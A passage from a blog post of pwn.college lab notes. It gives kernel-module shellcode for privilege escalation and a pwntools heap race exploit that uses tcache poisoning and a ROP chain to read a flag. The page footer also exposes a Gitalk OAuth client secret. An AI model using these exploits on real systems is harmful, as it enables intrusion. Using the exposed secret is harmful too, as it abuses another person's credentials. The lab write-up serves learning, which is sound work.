<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov     rdi, cs:shellcode<br>lea     rsi, [arg+8]<br>call    _copy_from_user ; PIC mode<br>mov     rax, [rsp+28h+shellcode_execute_addr]<br>call    __x86_indirect_thunk_rax ; PIC mode<br>xor     eax, eax<br></code></pre></div></td></tr></table></figure>

<p><del>so i can reuse the rdi as the shellcode address.</del>. emmmmm, use gdb.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ cat /proc/kallsyms | grep &#x27;device_ioctl&#x27;<br>0xffffffffc000092c t device_ioctl [challenge] <br></code></pre></div></td></tr></table></figure>

<p>and the kmalloc() address……</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">► <span class="hljs-number">0xffffffffc00009ac</span>    call   _copy_from_user            &lt;_copy_from_user&gt;<br>       rdi: <span class="hljs-number">0xffffc90000045000</span> ◂— <span class="hljs-number">0xffffffffffffffff</span>                       <br>       rsi: <span class="hljs-number">0x4ae388</span> ◂— <span class="hljs-number">0</span>                                                  <br>       rdx: <span class="hljs-number">0x0</span>                                                            <br></code></pre></div></td></tr></table></figure>

<p>shellcode is same like previous level.</p>
<p>script:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3\x00&quot;</span>;<br><span class="hljs-keyword">int</span> shellcode_len = <span class="hljs-number">25</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4096</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    test.len= shellcode_len;<br>    test.addr = (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0xffffc9000002f000</span>;<br>    <span class="hljs-built_in">memcpy</span>(test.a, shellcode, shellcode_len);<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;test);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>still win. but through a stupid way to find kmalloc()’s fixed address…..</p>
<h4 id="level8-5"><a href="#level8-5" class="headerlink" title="level8"></a>level8</h4><p>this challenge has two files. One for kernel module, the other for user land program to receive shellcode and add seccomp rules to itself(only write syscall is allowed).</p>
<p>nothing special.</p>
<h4 id="level9-5"><a href="#level9-5" class="headerlink" title="level9"></a>level9</h4><p>something strange in IDA…</p>
<p>Okay, just because the misdecompilation of <code>memset(v8, 0, 66)</code>. in mechine code it is <code>rep stod</code> with rcx=66 rdi=dest rax=content. and it need modify the struct name in Structures window.</p>
<p>we should fill with this structure, and overwrite the function pointer:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">00000000 logggg          struc ; (sizeof=0x108, align=0x8, copyof_570)<br>00000000                                         ; XREF: device_write/r<br>00000000 buffer          db 256 dup(?)<br>00000100 log_function    dq ?                    ; XREF: device_write+4A/w<br>00000100                                         ; device_write:loc_661/r ; offset<br>00000108 logggg          ends<br>00000108<br></code></pre></div></td></tr></table></figure>

<p>256 bytes shellcode and 8 bytes shellcode begin address.</p>
<blockquote>
<p>ATTENTION:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    __x86_indirect_thunk_rax ; PIC mode<br></code></pre></div></td></tr></table></figure>
<p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret in the end of it is enough.</p>
</blockquote>
<p>this module has local variable space on stack(and canary), so we can use the rdi to restore the stack context and make <code>ret</code> work normally.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//shellcode is also the same.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;...&quot;</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-number">264</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(test.buf, shellcode, <span class="hljs-number">256</span>);<br>    test.addr = (<span class="hljs-keyword">void</span>*)...;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, &amp;test, <span class="hljs-number">264</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="level10-5"><a href="#level10-5" class="headerlink" title="level10"></a>level10</h4><p>I cannt figure out the difference between this and previous level…..</p>
<h4 id="level11-5"><a href="#level11-5" class="headerlink" title="level11"></a>level11</h4><p>have user land program with seccomp constraint(write). </p>
<p>and the pwncollege proc <strong>cannt be read</strong> by user:hacker. we can use write to do privilege escalation.</p>
<h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><p>first fork a child to read the flag into bss segment, then delete the flag.<br>Next read shellcode which can only use write syscall.<br>the shellcode use write() to communicate with pwncollege kernel module for privilege escalation.<br>then use write() to print the bss segment content.</p>
<h1 id="module-E-advance"><a href="#module-E-advance" class="headerlink" title="module E-advance"></a>module E-advance</h1><h4 id="key-point-1"><a href="#key-point-1" class="headerlink" title="key point:"></a>key point:</h4><ul>
<li>Core concept: security checks that do not properly use mutexes are ineffective in a multithreaded environment!</li>
<li>keeps track of what do you know about the process and the program, what do you need to know, what you can do.</li>
<li><strong>Problem:</strong> we lack knowledge of:<ul>
<li>PIE base (binary address)</li>
<li>ASLR base (library addresses)</li>
<li>Stack base</li>
<li>Heap base</li>
<li>Canary</li>
</ul>
</li>
<li>may be a plan:<ol>
<li>Leak address of tcache_perthread_struct.</li>
<li>Compute address of pointer to main_arena.</li>
<li>Leak address of main_arena in libc’s BSS.</li>
<li> Compute libc base address.</li>
<li>Compute a thread stack address.</li>
<li>Leak the canary and overflow the stack or Overwrite the return address with a ropchain!</li>
</ol>
</li>
<li>first: heap base, via tcache poisoning.<ul>
<li>use race condition showed in the vedio, interleave <code>free</code> with <code>write</code>.</li>
</ul>
</li>
<li>When previous work is done, we get one address in per thread tcache memory. then by gdb it we can find the main_areana pointer in the same memory region. Then we have all threads <strong>heap metadata+libc base address</strong>.</li>
<li>Exploit Primitives:<ul>
<li>the building block of complex exploitation:<br>arbitrary read, arbitrary write, arbitrary call. or controlled ones.</li>
<li>the slides demonstrate an exp example of multithread message storing service.</li>
<li>use wrapped code for reuse intention.</li>
</ul>
</li>
<li>kernel race:<ul>
<li>syscalls, file access, interrupts can be triggered simultaneously.</li>
<li>prevention and recent situation in <a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/16MN3BneO7l16SX_cpvTYlV25nfdRuqfRIRQvV-iURa0/edit#slide=id.gade02eaa21_0_5">SLIDES</a> </li>
</ul>
</li>
</ul>
<p>e.g.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork() =<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>            r1.sendline(<span class="hljs-string">&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0&quot;</span>)<br>        os.kill(os.getpid()，<span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        r2.sendline(<span class="hljs-string">&quot;printf 0&quot;</span>)<br>    os.wait()<br>    output = r2.clean()<br>    r1.clean()<br>    leak = pwn.u64(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>，<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    r1.clean()<br>    r2.clean()<br>    <br>    packed =pwn.p64(addr)<br>    r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx&#125;</span> malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span> free <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&quot;free <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>            os.kill(os.getpid(),<span class="hljs-number">9</span>)<br>		r2.send((<span class="hljs-string">b&quot;scanf %d &quot;</span>%idx + packed + <span class="hljs-string">b&quot;\n&quot;</span>)*<span class="hljs-number">2000</span>)<br>         os.wait()<br>         time.sleep(<span class="hljs-number">0.1</span>)<br>         r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx&#125;</span> printf <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>         r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>         stored = r1.readline()[:-<span class="hljs-number">1</span>]<br>		<span class="hljs-keyword">if</span> stored == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>         	<span class="hljs-keyword">break</span><br>	r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>	r1.clean()<br>	idx += <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>	r1.sendline(<span class="hljs-string">f&quot;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>    output = r1.readline()[:-<span class="hljs-number">1</span>]<br>    leak = pwn.u64(output[:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>， <span class="hljs-string">b&#x27;\0 &#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1,，r2，addr , value</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>    r1.send(<span class="hljs-string">b&quot;scanf %d &quot;</span>%(idx-<span class="hljs-number">1</span>) + value + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    p.kill()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br><br>p=pwn.process( <span class="hljs-string">&quot;./ult&quot;</span>)<br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;continue\n&quot;)</span><br><span class="hljs-comment">#time.sleep(1)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/naps&quot;</span> ).read())<br>r1 =pwn. remote( <span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote( <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>)<br>r3 =pwn.remote( <span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - ox8d0 + <span class="hljs-number">0x890</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CONPUTED: MAIN_ARENA_PTR: &quot;</span> , <span class="hljs-built_in">hex</span>(main_arena_ptr_address))<br>main_arena_address = arbitrary_read(r1，r2, main_arena_ptr_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: MAIN_ARENA: &quot;</span>,<span class="hljs-built_in">hex</span>(nain_arena_address))<br>libc_base = main_arena_address - <span class="hljs-number">0x1ebb80</span><br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;COMPUTED: LIBC_BASE: &quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_address = libc_base - <span class="hljs-number">0x4138</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: STORED_RIP_ADDRESS:&quot;</span> , <span class="hljs-built_in">hex</span>(stored_rip_address))<br>addr_in_binary = arbitrary_read(r1，r2,stored_rip_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: ADDR IN BINARY:&quot;</span> , <span class="hljs-built_in">hex</span>(addr_in_binary))<br>bin_base = addr_in_binary - <span class="hljs-number">0x172f</span><br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;COMPUTED: BINARY BASE: &quot;</span> , <span class="hljs-built_in">hex</span>(bin_base))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!! LET&#x27;S ROLLING !!!!!!&quot;</span>)<br>libc = p.elf.libc<br>libc.address = libc_base<br>pwn.context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\xoc\xod\xoe\x20&quot;</span>)<br>rop.call( <span class="hljs-string">&quot;close&quot;</span>,[<span class="hljs-number">3</span>]) 	<span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call( <span class="hljs-string">&quot;read&quot;</span>，[<span class="hljs-number">0</span>,libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">42</span>])<br>rop.call( <span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>)，<span class="hljs-number">0</span>])<br>rop.call( <span class="hljs-string">&quot;sendfile&quot;</span>，[<span class="hljs-number">1</span>，<span class="hljs-number">3</span>，<span class="hljs-number">0</span>，<span class="hljs-number">1024</span>])<br>rop.call( <span class="hljs-string">&quot;exit&quot;</span>,[<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1，r2，stored_rip_address, rop.chain())<br>r1.sendline( <span class="hljs-string">&quot;quit&quot;</span>)<br>p.send( <span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure>

<p>finally, i come to the last module level.</p>
<h4 id="level1-4"><a href="#level1-4" class="headerlink" title="level1"></a>level1</h4><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.
<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.
<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022-03/Now-CSCD70/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CSCD70 && LLVM</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022-01/Learning-Computer-Networking/">
                        <span class="hidden-mobile">Computer Networking</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: '5a166c11dfbe42a6f7e9e0bfe442b757'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>









  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js" ></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({"theme":"default"});
    }
  </script>







<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
